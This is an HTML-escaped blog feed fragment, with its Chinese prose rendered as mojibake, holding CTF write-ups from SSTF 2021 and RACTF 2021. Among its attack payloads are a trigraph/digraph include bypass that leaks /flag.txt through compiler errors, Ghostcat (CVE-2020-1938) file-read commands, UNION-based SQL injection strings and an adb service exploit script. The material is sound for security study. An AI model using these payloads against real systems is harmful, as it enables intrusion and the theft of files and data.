&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816213453433.png" alt="image-20210816213453433">&lt;/p>
&lt;p>å¥½å®¶ä¼™ï¼Œæ¢¦å›žå­¦cè¯­è¨€çš„æ—¶å€™ï¼Œçœ‹åˆ°è¿™ä¸ªéª°å­çš„æ¦‚çŽ‡åˆèƒ½æ¢¦å›žé«˜ä¸‰æ•°å­¦çš„æ¦‚çŽ‡éƒ¨åˆ†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816233522899.png" alt="image-20210816233522899">&lt;/p>
&lt;p>ä½†æ˜¯æï¼Œå®ƒå¹¶ä¸éœ€è¦ä½ å…·ä½“å†™å‡ºæ¥codeï¼Œæ ‡ç­”å·²ç»ç»™å‡ºï¼ˆè™½ç„¶æˆ‘æ†¨æ†¨çš„ä¸€å¼€å§‹æ²¡å‘çŽ°è‡ªå·±è¿˜å†™äº†ä¸€ä»½ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">scanf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d/%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ç„¶ç›´æŽ¥è®¿é—®/flag.txtåˆæ˜¯ä¸å¯ä»¥çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210817001655162.png" alt="image-20210817001655162">&lt;/p>
&lt;p>é—®é¢˜å°±è½¬åŒ–ä¸ºäº†å¦‚ä½•åœ¨è¾“å‡ºä¸ºç¬¦åˆæ ·ä¾‹è¦æ±‚çš„æ ‡å‡†è¾“å‡ºçš„æƒ…å†µä¸‹è¿˜èƒ½æ‰“å°ä¸€ä»½åœ°å€å·²çŸ¥çš„flag.txtå‡ºæ¥&lt;/p>
&lt;p>ç”±äºŽgccæ—¢èƒ½ç¼–è¯‘cä¹Ÿå¯ä»¥ç¼–è¯‘c++ï¼Œè¿™é‡Œç”¨importæ¥ç»•è¿‡å¯¹includeçš„é™åˆ¶ï¼›è€Œå¯¹äºŽ#çš„ç»•è¿‡å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs and trigraphs&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;span style="color:#f92672">%:&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›¸å½“äºŽ&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">#import &amp;ldquo;/flag.txt&amp;rdquo;&lt;/a>ï¼Œä»Žgccç¼–è¯‘æ—¶çš„æŠ¥é”™ä¿¡æ¯å¯ä»¥å¾—åˆ°flag&lt;/p>
&lt;p>æˆ–è€…ç”¨åæ–œæ +æ¢è¡Œçš„å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">incl&lt;/span>\
&lt;span style="color:#111">ude&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥ç»•è¿‡å¯¹includeçš„è¿‡æ»¤&lt;/p>
&lt;p>&lt;code>SCTF{take-care-when-execute-unknown-code}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”ç±»ä¼¼çš„é¢˜ä¹‹å‰åšè¿‡ä¸€ä¸ª&lt;a href="https://imagin.vip/?p=1063#CaaS">[FireshellCTF2020]Caas&lt;/a>ï¼Œä¹Ÿæ˜¯é¢„å¤„ç†éåŽ†æŠ¥é”™å‡ºflag&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨çœ‹äº†&lt;a href="https://zhuanlan.zhihu.com/p/401197671">åˆ«çš„å¸ˆå‚…çš„wp&lt;/a>ä¹‹åŽçœ‹åˆ°äº†å¦ä¸€ç§è§£æ³•ï¼Œä»Žæœªè®¾æƒ³è¿‡çš„é“è·¯&lt;/p>
&lt;h2 id="webpoxe-center">Web/Poxe Center&lt;/h2>
&lt;blockquote>
&lt;p>how to get legendary poxemon?&lt;/p>
&lt;/blockquote>
&lt;p>çœ‹äº†&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">wp&lt;/a>ï¼Œç›´æŽ¥sqlmapä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904145411586.png" alt="image-20210904145411586">&lt;/p>
&lt;p>ä¸è¿‡å®˜æ–¹çš„é¢„æœŸè§£wpæ›´å¤æ‚ä¸€äº›ï¼š&lt;/p>
&lt;p>å…ˆçˆ†ç›®å½•/docs/&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904152658881.png" alt="image-20210904152658881">&lt;/p>
&lt;p>è¿™ä¸ªç‰ˆæœ¬ä¸‹æœ‰&lt;a href="https://www.chaitin.cn/zh/ghostcat">CVE-2020-1938 - Ghostcat&lt;/a>ï¼Œç›¸å…³æ–‡ç« å‚è€ƒ-&amp;gt;&lt;a href="https://paper.seebug.org/1147/">ä¸è°ƒè¯•æºç é‡çŽ° Ghostcat æ¼æ´ž (CVE-2020-1938)&lt;/a>&lt;/p>
&lt;p>ä½¿ç”¨&lt;a href="https://github.com/hypn0s/AJPy">å…¬å¼€çš„poc&lt;/a>è¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œä¹‹åŽå°†classåç¼–è¯‘èŽ·å¾—javaæºæ–‡ä»¶ï¼ˆå®˜æ–¹pocç²¾ç®€äº†ä¸€äº›å†…å®¹ ä¸è¿‡å¤§å·®ä¸å·®ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>python poc.py -p 31811 -f &amp;quot;/WEB-INF/web.xml&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/MainController.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml&amp;quot; 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>/WEB-INF/classes/mapper/gochaMapper.xmlæ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904163606221.png" alt="image-20210904163606221">&lt;/p>
&lt;p>è¿™é‡Œçš„sortNameå’ŒsortFlagç›´æŽ¥æ‹¼æŽ¥è¿›sqlè¯­å¥ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œå°è¯•sqli&lt;/p>
&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select true) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select false) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag=NULL
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT DD.&amp;quot;index&amp;quot;,DD.&amp;quot;name&amp;quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info
sortFlag=&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;code>{G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}&lt;/code>&lt;/p>
&lt;h2 id="miscmelorean">Misc/meLorean&lt;/h2>
&lt;blockquote>
&lt;p>There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles.
He left a note and then disappeared. Help to decode it.&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ï¼Œå……æ»¡äº†äºŒç»´åæ ‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904143738246.png" alt="image-20210904143738246">&lt;/p>
&lt;p>ä¸€ä¸ªçº¿æ€§å›žå½’çš„ç›¸å…³é—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°pythonä¸­çš„sklearn.linear_modelè¿›è¡Œæ•°æ®å¤„ç†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ast&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sklearn.linear_model&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataset.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ast&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">literal_eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">X&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">X&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">coef_&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Pr0gre55_In_R3gr3ss}&lt;/code>&lt;/p>
&lt;h2 id="adbaby">ADBaby&lt;/h2>
&lt;p>æ˜¯åœ¨&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">çœ‹wp&lt;/a>çš„æ—¶å€™æ³¨æ„åˆ°çš„é¢˜ï¼Œçœ‹äº†ä¸ªå¤§æ¦‚æµç¨‹ï¼ˆå…¶å®žåªæ˜¯çœ¼ç†Ÿadbè€Œå·² èœé¸¡ åˆ«éª‚äº†ï¼‰ï¼Œæ‰€ä»¥ä¸‹é¢å°±æ˜¯å¤§æ¦‚ç¿»è¯‘ä¸€ä¸‹wpï¼Œå¾ˆæ°´&lt;/p>
&lt;p>å…ˆè¿žæŽ¥ä¸Š&lt;code>adb connect adbaby.sstf.site:6666&lt;/code>ï¼Œå‘çŽ°è¿™æ˜¯ä¸€ä¸ªé­”æ”¹è¿‡çš„adbï¼Œå±è”½äº†shellå’Œä¸»è¦åŠŸèƒ½ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨push/pullï¼Œå±žäºŽæ–‡ä»¶ç®¡ç†ç±»çš„å‘½ä»¤ï¼ˆå…¨éƒ¨æŒ‡ä»¤å‚è§-&amp;gt;&lt;a href="https://www.jianshu.com/p/839c04b7e1e3">ä½ ç¡®å®šå·²ç»æŽŒæ¡äº†adbçš„ä½¿ç”¨ï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;code>adb pull /proc/self/exe adbaby&lt;/code>æ‹¿åˆ°æ–‡ä»¶ç”¨IDAè¿›è¡Œåˆ†æžï¼Œå¯ä»¥çœ‹åˆ°flagçš„è·¯å¾„åœ¨/data/local/tmp/flagå¤„ï¼Œä½†ç›´æŽ¥ç”¨adb pullæ˜¯ä¸å¯è¾¾çš„ï¼Œå› ä¸ºå¯¹&lt;code>./&lt;/code>, &lt;code>../&lt;/code>, &lt;code>data&lt;/code>, &lt;code>local&lt;/code>, &lt;code>tmp&lt;/code>, &lt;code>flag&lt;/code>è¿™äº›å­—çœ¼è¿›è¡Œäº†è¿‡æ»¤&lt;/p>
&lt;p>æœ‰ä¸€ä¸ªè‡ªå®šçš„serviceåä¸ºadb Flag Serviceï¼Œå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œmd5åŽå¼€å¤´æ˜¯0123456çš„è¯å°±å¯ä»¥æ‹¿åˆ°flagï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹ 415349420009&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">adb&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>
&lt;span style="color:#111">device&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AdbCommands&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectDevice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">serial&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;adbaby.sstf.site:6666&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">InteractiveShellCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;415349420009&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Do_Uth1nk_th1s_1s_adb}&lt;/code>&lt;/p></description></item><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/ractf/challenges/tree/master/2021">https://github.com/ractf/challenges/tree/master/2021&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/404dcd/RACTF-challenges">https://github.com/404dcd/RACTF-challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.ractf.co.uk/tag/ractf-2021/">https://blog.ractf.co.uk/tag/ractf-2021/&lt;/a>&lt;/p>
&lt;h2 id="webreally-awesome-monitoring-dashboard">Web/Really Awesome Monitoring Dashboard&lt;/h2>
&lt;blockquote>
&lt;p>ðŸŒŸ Perfect infrastructure ðŸŒŸ&lt;/p>
&lt;/blockquote>
&lt;p>æ˜¯grafana&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png" alt="image-20210818005221430">&lt;/p>
&lt;p>ä½†æ˜¯ç‰ˆæœ¬ä¹Ÿå¤ªæ–°äº†å§8.1.1ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¸åœçš„è¯·æ±‚å„ç§apiï¼Œå…¶ä¸­æœ‰ä¸ª/api/ds/queryï¼Œä»¥æ˜Žæ–‡æ–¹å¼è¯·æ±‚æ•°æ®åº“å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
&lt;p>é‚£è¿™å°±å¥½è¯´äº†ï¼Œç›´æŽ¥æ˜Žç‰Œäº†éƒ½&lt;/p>
&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
SELECT * FROM flags;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å¯¹äºŽæƒé™çš„è®¾ç½®æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸è¦éšä¾¿æŠŠapiæŽ¥å£æš´éœ²å‡ºæ¥ï¼Œä¹Ÿä¸è¦æ˜Žæ–‡ä¼ é€’ä¿¡æ¯&lt;/p>
&lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
&lt;blockquote>
&lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>ä¸€ä¸ªTorçš„ç½‘ç«™ï¼Œèµ°åŒ¿åæ–¹å¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
&lt;p>é‚£é¦–å…ˆè¦æŠŠéšè—åœ¨åŽé¢çš„çœŸå®žipç»™æ‰¾å‡ºæ¥ã€‚æ•´ä¸ªç½‘é¡µçš„å†…å®¹æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä½†æ˜¯é€šå¸¸å®¹æ˜“è¢«å¿½ç•¥çš„æ˜¯faviconå›¾åƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒè¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼š&lt;a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">Hunting phishing websites with favicon hashes&lt;/a>&lt;/p>
